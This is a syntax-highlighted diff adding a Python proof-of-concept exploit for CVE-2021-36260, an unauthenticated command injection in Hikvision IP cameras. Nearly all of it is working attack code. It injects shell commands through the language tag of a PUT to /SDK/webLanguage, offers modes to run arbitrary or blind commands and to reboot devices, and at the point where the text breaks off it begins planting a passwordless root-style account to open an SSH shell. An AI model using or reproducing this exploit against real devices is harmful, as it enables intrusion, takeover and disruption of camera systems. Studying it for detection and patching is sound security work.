+# Vendor Homepage: https://www.hikvision.com/
+# Version: 1.0
+# CVE: CVE-2021-36260
+# Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
+</span>
+<span class="c1"># All credit to Watchful_IP
+</span>
+<span class="c1">#!/usr/bin/env python3
+</span>
+<span class="sh">"""</span><span class="s">
+Note:
+1)  This code will _not_ verify if remote is Hikvision device or not.
+2)  Most of my interest in this code has been concentrated on how to
+    reliably detect vulnerable and/or exploitable devices.
+    Some devices are easy to detect, verify and exploit the vulnerability,
+    other devices may be vulnerable but not so easy to verify and exploit.
+    I think the combined verification code should have very high accuracy.
+3)  </span><span class="sh">'</span><span class="s">safe check</span><span class="sh">'</span><span class="s"> (--check) will try write and read for verification
+    </span><span class="sh">'</span><span class="s">unsafe check</span><span class="sh">'</span><span class="s"> (--reboot) will try reboot the device for verification
+[Examples]
+Safe vulnerability/verify check:
+    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check
+Safe and unsafe vulnerability/verify check:
+(will only use </span><span class="sh">'</span><span class="s">unsafe check</span><span class="sh">'</span><span class="s"> if not verified with </span><span class="sh">'</span><span class="s">safe check</span><span class="sh">'</span><span class="s">)
+    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot
+Unsafe vulnerability/verify check:
+    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot
+Launch and connect to SSH shell:
+    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell
+Execute command:
+    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd </span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="s">
+Execute blind command:
+    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"</span><span class="s">
+$./CVE-2021-36260.py -h
+[*] Hikvision CVE-2021-36260
+[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)
+usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]
+                         [--reboot] [--shell] [--cmd CMD]
+                         [--cmd_blind CMD_BLIND] [--noverify]
+                         [--proto {http,https}]
+optional arguments:
+  -h, --help            show this help message and exit
+  --rhost RHOST         Remote Target Address (IP/FQDN)
+  --rport RPORT         Remote Target Port
+  --check               Check if vulnerable
+  --reboot              Reboot if vulnerable
+  --shell               Launch SSH shell
+  --cmd CMD             execute cmd (i.e: </span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="s">)
+  --cmd_blind CMD_BLIND
+                        execute blind cmd (i.e: </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"</span><span class="s">)
+  --noverify            Do not verify if vulnerable
+  --proto {http,https}  Protocol used
+$
+</span><span class="sh">"""</span>
+
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">packages</span>
+<span class="kn">from</span> <span class="n">requests.packages</span> <span class="kn">import</span> <span class="n">urllib3</span>
+<span class="kn">from</span> <span class="n">requests.packages.urllib3</span> <span class="kn">import</span> <span class="n">exceptions</span>
+
+
+<span class="k">class</span> <span class="nc">Http</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">proto</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">):</span>
+        <span class="nf">super</span><span class="p">(</span><span class="n">Http</span><span class="p">,</span> <span class="n">self</span><span class="p">).</span><span class="nf">__init__</span><span class="p">()</span>
+
+        <span class="n">self</span><span class="p">.</span><span class="n">rhost</span> <span class="o">=</span> <span class="n">rhost</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">rport</span> <span class="o">=</span> <span class="n">rport</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">proto</span> <span class="o">=</span> <span class="n">proto</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span>
+
+        <span class="n">self</span><span class="p">.</span><span class="n">remote</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">=</span> <span class="bp">None</span>
+
+        <span class="sh">"""</span><span class="s"> Most devices will use self-signed certificates, suppress any warnings </span><span class="sh">"""</span>
+        <span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+        <span class="n">self</span><span class="p">.</span><span class="n">remote</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+
+        <span class="n">self</span><span class="p">.</span><span class="nf">_init_uri</span><span class="p">()</span>
+
+        <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">*/*</span><span class="sh">'</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">X-Requested-With</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">XMLHttpRequest</span><span class="sh">'</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded; charset=UTF-8</span><span class="sh">'</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">Accept-Encoding</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">gzip, deflate</span><span class="sh">'</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">Accept-Language</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">en-US,en;q=0.9,sv;q=0.8</span><span class="sh">'</span><span class="p">,</span>
+        <span class="p">})</span>
+        <span class="sh">"""</span><span class="s">
+        self.remote.proxies.update({
+            # </span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="s">,
+        })
+        </span><span class="sh">"""</span>
+
+    <span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
+
+        <span class="k">if</span> <span class="n">query_args</span><span class="p">:</span>
+            <span class="sh">"""</span><span class="s">Some devices can handle more, others less, 22 bytes seems like a good compromise</span><span class="sh">"""</span>
+            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">query_args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">22</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[!] Error: Command </span><span class="sh">"</span><span class="si">{</span><span class="n">query_args</span><span class="si">}</span><span class="sh">"</span><span class="s"> to long (</span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">query_args</span><span class="p">)</span><span class="si">}</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
+                <span class="k">return</span> <span class="bp">None</span>
+
+        <span class="sh">"""</span><span class="s">This weird code will try automatically switch between http/https
+        and update Host
+        </span><span class="sh">"""</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">url</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">query_args</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/SDK/webLanguage</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">proto</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span> <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">proto</span> <span class="o">==</span> <span class="sh">'</span><span class="s">http</span><span class="sh">'</span> <span class="k">else</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">_init_uri</span><span class="p">()</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">url</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">query_args</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/SDK/webLanguage</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
+            <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+                <span class="k">return</span> <span class="bp">None</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">None</span>
+        <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">None</span>
+
+        <span class="sh">"""</span><span class="s">302 when requesting http on https enabled device</span><span class="sh">"""</span>
+
+        <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+            <span class="n">redirect</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Location</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">[:</span><span class="n">redirect</span><span class="p">.</span><span class="nf">rfind</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)]</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">_update_host</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">url</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">query_args</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/SDK/webLanguage</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">data</span>
+
+    <span class="k">def</span> <span class="nf">_update_host</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">.</span><span class="nf">rfind</span><span class="p">(</span><span class="sh">'</span><span class="s">://</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">:]:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span>
+                <span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span><span class="p">.</span><span class="nf">rfind</span><span class="p">(</span><span class="sh">'</span><span class="s">://</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">:],</span>
+            <span class="p">})</span>
+
+    <span class="k">def</span> <span class="nf">_init_uri</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">=</span> <span class="sh">'</span><span class="s">{proto}://{rhost}:{rport}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">proto</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proto</span><span class="p">,</span> <span class="n">rhost</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">rport</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">query_args</span><span class="p">,</span> <span class="n">timeout</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Command injection in the &lt;language&gt; tag</span><span class="sh">"""</span>
+        <span class="n">query_args</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">UTF-8</span><span class="sh">"</span><span class="s">?&gt;</span><span class="sh">'</span> \
+                     <span class="sa">f</span><span class="sh">'</span><span class="s">&lt;language&gt;$(</span><span class="si">{</span><span class="n">query_args</span><span class="si">}</span><span class="s">)&lt;/language&gt;</span><span class="sh">'</span>
+        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">+</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">query_args</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">remote</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">uri</span> <span class="o">+</span> <span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    status_code == 200 (OK);
+        Verified vulnerable and exploitable
+    status_code == 500 (Internal Server Error);
+        Device may be vulnerable, but most likely not
+        The SDK webLanguage tag is there, but generate status_code 500 when language not found
+        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)
+        (Issue: Could also be other directory than </span><span class="sh">'</span><span class="s">webLib</span><span class="sh">'</span><span class="s">, r/o FS etc...)
+    status_code == 401 (Unauthorized);
+        Defiantly not vulnerable
+    </span><span class="sh">"""</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">noverify</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Not verifying remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Checking remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] Cannot establish connection to </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[i] ETag:</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">ETag</span><span class="sh">'</span><span class="p">))</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">&gt;webLib/c</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"</span><span class="s"> do not looks like Hikvision</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">status_code</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/c</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="sh">"""</span><span class="s">We could not verify command injection</span><span class="sh">"""</span>
+        <span class="k">if</span> <span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] Could not verify if vulnerable (Code: </span><span class="si">{</span><span class="n">status_code</span><span class="si">}</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">reboot</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nf">check_reboot</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] Remote is not vulnerable (Code: </span><span class="si">{</span><span class="n">status_code</span><span class="si">}</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[!] Remote is verified exploitable</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">check_reboot</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    We sending </span><span class="sh">'</span><span class="s">reboot</span><span class="sh">'</span><span class="s">, wait 2 sec, then checking with GET request.
+    - if there is data returned, we can assume remote is not vulnerable.
+    - If there is no connection or data returned, we can assume remote is vulnerable.
+    </span><span class="sh">"""</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[i] Checking if vulnerable with </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Checking remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="si">}</span><span class="sh">"</span><span class="s"> with </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"'</span><span class="p">)</span>
+    <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">reboot</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[!] Remote is vulnerable</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Remote is not vulnerable</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+
+<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="si">}</span><span class="s">&gt;webLib/x</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/x</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[!] Error execute cmd </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">cmd_blind</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    Blind command injection
+    </span><span class="sh">"""</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[-] Error execute cmd </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[i] Try execute blind cmd </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="si">}</span><span class="sh">"'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">/N</span><span class="sh">'</span><span class="p">,</span> <span class="n">query_args</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[i] Remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="sh">"</span><span class="s"> not pwned, pwning now!</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">echo -n P::0:0:W&gt;N</span><span class="sh">'</span><span class="p">)</span>
